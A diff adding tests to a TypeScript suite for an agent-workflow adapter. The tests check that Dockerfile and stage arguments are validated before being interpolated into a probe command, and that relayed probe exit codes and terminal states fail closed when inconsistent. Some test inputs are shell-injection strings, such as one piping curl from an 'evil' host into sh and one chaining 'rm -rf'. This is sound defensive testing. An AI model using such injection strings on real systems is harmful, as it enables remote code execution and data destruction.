@@ -625,6 +625,162 @@ describe('(c) control flow with stubbed Workflow globals (T4)', () => {
     expect(happy.calls).toHaveLength(4);
   });
 
+  it('R3 F2: target.dockerfile and every target.stages entry are constrained before interpolation; refused with no agent call', async () => {
+    for (const target of [
+      { dockerfile: 'Dockerfile; curl evil | sh; #', stages: ['production-base', 'builder'] },
+      { dockerfile: 'Dockerfile', stages: ['production-base && rm -rf x'] },
+      { dockerfile: 'Dockerfile', stages: ['production-base', 'builder && rm -rf x'] },
+      { dockerfile: 'Dockerfile', stages: [1] },
+      { dockerfile: 'Dockerfile', stages: ['production-base', 1] },
+      { dockerfile: 'Dockerfile', stages: ['builder', 'builder'] },
+      { dockerfile: 'Dockerfile', stages: [] },
+      { dockerfile: 'Dockerfile', stages: 'builder' },
+      { dockerfile: 'Dockerfile', stages: [''] },
+      { dockerfile: 'Dockerfile', stages: ['$STAGE'] },
+      { dockerfile: '', stages: ['builder'] },
+      { dockerfile: 42, stages: ['builder'] },
+      { dockerfile: 'Docker file', stages: ['builder'] },
+      { dockerfile: '$DOCKERFILE', stages: ['builder'] },
+    ]) {
+      const run = await runAdapter({ ...ARGS, target }, happyResponder);
+      const result = asRecord(run.result);
+      expect(typeof result.refused, JSON.stringify(target)).toBe('string');
+      expect(String(result.refused), JSON.stringify(target)).toContain('args.target.');
+      expect(run.calls, JSON.stringify(target)).toHaveLength(0);
+      expect(run.phases, JSON.stringify(target)).toHaveLength(0);
+    }
+    // a valid non-default target is interpolated as given (one probe result per stage relayed)
+    const custom = { dockerfile: 'Dockerfile.gcp', stages: ['builder'] };
+    const run = await runAdapter({ ...ARGS, target: custom }, (phase) =>
+      phase === 'RED_SYNTHESIS' ? okStage(phase, { probeResults: [PROBE_RESULTS[1]] }) : okStage(phase),
+    );
+    expect(run.calls).toHaveLength(4);
+    expect(run.calls[3].prompt).toContain(
+      `npx tsx packages/mps-pattern-proof/scripts/red-probe.ts --dockerfile Dockerfile.gcp --stage builder --executor auto --json --out ${ARGS.evidenceDir}/probe-builder.json`,
+    );
+    expect(run.calls[3].prompt).not.toContain('--stage production-base');
+    const result = asRecord(run.result);
+    expect(result).toMatchObject({ stoppedAt: 'RED_SYNTHESIS', terminal: false });
+    expect(asRecord(result.artifactPaths).probes).toEqual([`${ARGS.evidenceDir}/probe-builder.json`]);
+  });
+
+  it('R3 F6: a relayed probe exitCode must agree with its classification (0 PASS, 1 FAIL, 2 BLOCKED); runId/mode must be this run', async () => {
+    const cases: readonly [string, Record<string, unknown>][] = [
+      ['exit 0 relayed as FAIL', { probeResults: [{ ...PROBE_RESULTS[0], exitCode: 0 }, PROBE_RESULTS[1]] }],
+      [
+        'exit 2 relayed as PASS',
+        {
+          probeResults: [
+            PROBE_RESULTS[0],
+            { ...PROBE_RESULTS[1], exitCode: 2, classification: 'PASS', reasonCode: 'INSTALL_COMPLETED' },
+          ],
+        },
+      ],
+      [
+        'exit 1 relayed as BLOCKED',
+        {
+          probeResults: [
+            { ...PROBE_RESULTS[0], exitCode: 1, classification: 'BLOCKED', reasonCode: 'TIMEOUT' },
+            PROBE_RESULTS[1],
+          ],
+        },
+      ],
+      ['exit 3 relayed as FAIL', { probeResults: [PROBE_RESULTS[0], { ...PROBE_RESULTS[1], exitCode: 3 }] }],
+      ['a string exitCode', { probeResults: [PROBE_RESULTS[0], { ...PROBE_RESULTS[1], exitCode: '1' }] }],
+      [
+        'runSummary.mode FULL_PATTERN_PROOF',
+        { runSummary: { ...HAPPY_RUN_SUMMARY, mode: 'FULL_PATTERN_PROOF' } },
+      ],
+      ['runSummary.runId of another run', { runSummary: { ...HAPPY_RUN_SUMMARY, runId: 'other' } }],
+    ];
+    for (const [label, overrides] of cases) {
+      const run = await runAdapter(ARGS, (phase) =>
+        phase === 'RED_SYNTHESIS' ? okStage(phase, overrides) : okStage(phase),
+      );
+      expect(run.calls, label).toHaveLength(4);
+      const result = asRecord(run.result);
+      expect(result, label).toMatchObject({ failedClosed: true, atPhase: 'RED_SYNTHESIS' });
+      expect(result.stoppedAt, label).toBeUndefined();
+      expect(result.terminal, label).toBeUndefined();
+      expect(typeof result.reason, label).toBe('string');
+    }
+    // the consistent shapes are admitted: PASS/0 and BLOCKED/2 alongside FAIL/1, and a summary without runId/mode
+    const consistent = await runAdapter(ARGS, (phase) =>
+      phase === 'RED_SYNTHESIS'
+        ? okStage(phase, {
+            probeResults: [
+              { ...PROBE_RESULTS[0], exitCode: 0, classification: 'PASS', reasonCode: 'INSTALL_COMPLETED' },
+              { ...PROBE_RESULTS[1], exitCode: 2, classification: 'BLOCKED', reasonCode: 'TIMEOUT' },
+            ],
+          })
+        : okStage(phase),
+    );
+    expect(asRecord(consistent.result)).toMatchObject({ stoppedAt: 'RED_SYNTHESIS', terminal: false });
+    const { runId: _runId, mode: _mode, ...anonymous } = HAPPY_RUN_SUMMARY;
+    const withoutIdentity = await runAdapter(ARGS, (phase) =>
+      phase === 'RED_SYNTHESIS' ? okStage(phase, { runSummary: anonymous }) : okStage(phase),
+    );
+    expect(asRecord(withoutIdentity.result)).toMatchObject({ stoppedAt: 'RED_SYNTHESIS', terminal: false });
+    // the harness schema now describes runId and mode as strings (still optional)
+    const redSchema = consistent.calls[3].opts.schema as SubsetSchema;
+    expect(redSchema.properties?.runSummary?.properties?.runId).toEqual({ type: 'string' });
+    expect(redSchema.properties?.runSummary?.properties?.mode).toEqual({ type: 'string' });
+    expect(redSchema.properties?.runSummary?.required).toEqual(['exitCode', 'phase', 'storedArtifacts']);
+  });
+
+  it('R3 F6: an exit-3 relay is terminal only for one of the six frozen terminal states of this run; otherwise it fails closed', async () => {
+    const terminalSummary = (terminalState: unknown, extra: Record<string, unknown> = {}) => ({
+      ok: true,
+      exitCode: 3,
+      runId: ARGS.runStamp,
+      mode: 'BOOTSTRAP_RED_ONLY',
+      phase: 'RED_SYNTHESIS',
+      terminalState,
+      storedArtifacts: ['discovery', 'dependency-graph', 'decision-gate'],
+      ...extra,
+    });
+    for (const state of [
+      'HUMAN_DECISION_REQUIRED',
+      'MISSING_AUTHORITY',
+      'SCOPE_VIOLATION',
+      'FALSIFIED',
+      'NOT_PROVEN',
+      'NON_REPRODUCIBLE',
+    ]) {
+      const run = await runAdapter(ARGS, (phase) =>
+        phase === 'RED_SYNTHESIS' ? okStage(phase, { runSummary: terminalSummary(state) }) : okStage(phase),
+      );
+      expect(run.calls, state).toHaveLength(4);
+      expect(asRecord(run.result), state).toMatchObject({
+        stoppedAt: 'RED_SYNTHESIS',
+        terminal: true,
+        terminalState: state,
+      });
+      expect(asRecord(run.result).failedClosed, state).toBeUndefined();
+    }
+    const bad: readonly [string, Record<string, unknown>][] = [
+      ['no terminalState', terminalSummary(undefined)],
+      ['null terminalState', terminalSummary(null)],
+      ['ACCEPT is not a terminal state', terminalSummary('ACCEPT')],
+      ['DONE is not a terminal state', terminalSummary('DONE')],
+      ['PROVEN is never a state', terminalSummary('PROVEN')],
+      ['lower-case spelling', terminalSummary('missing_authority')],
+      ['a foreign mode', terminalSummary('MISSING_AUTHORITY', { mode: 'FULL_PATTERN_PROOF' })],
+      ['a foreign runId', terminalSummary('MISSING_AUTHORITY', { runId: 'other' })],
+    ];
+    for (const [label, runSummary] of bad) {
+      const run = await runAdapter(ARGS, (phase) =>
+        phase === 'RED_SYNTHESIS' ? okStage(phase, { runSummary }) : okStage(phase),
+      );
+      expect(run.calls, label).toHaveLength(4);
+      const result = asRecord(run.result);
+      expect(result, label).toMatchObject({ failedClosed: true, atPhase: 'RED_SYNTHESIS' });
+      expect(result.terminal, label).toBeUndefined();
+      expect(result.stoppedAt, label).toBeUndefined();
+      expect(typeof result.reason, label).toBe('string');
+    }
+  });
+
   it('runSummary.exitCode 3 (a terminal state decided by ppe-cli run) is returned as a terminal stop, not a failure', async () => {
     const terminalSummary = {
       ok: true,
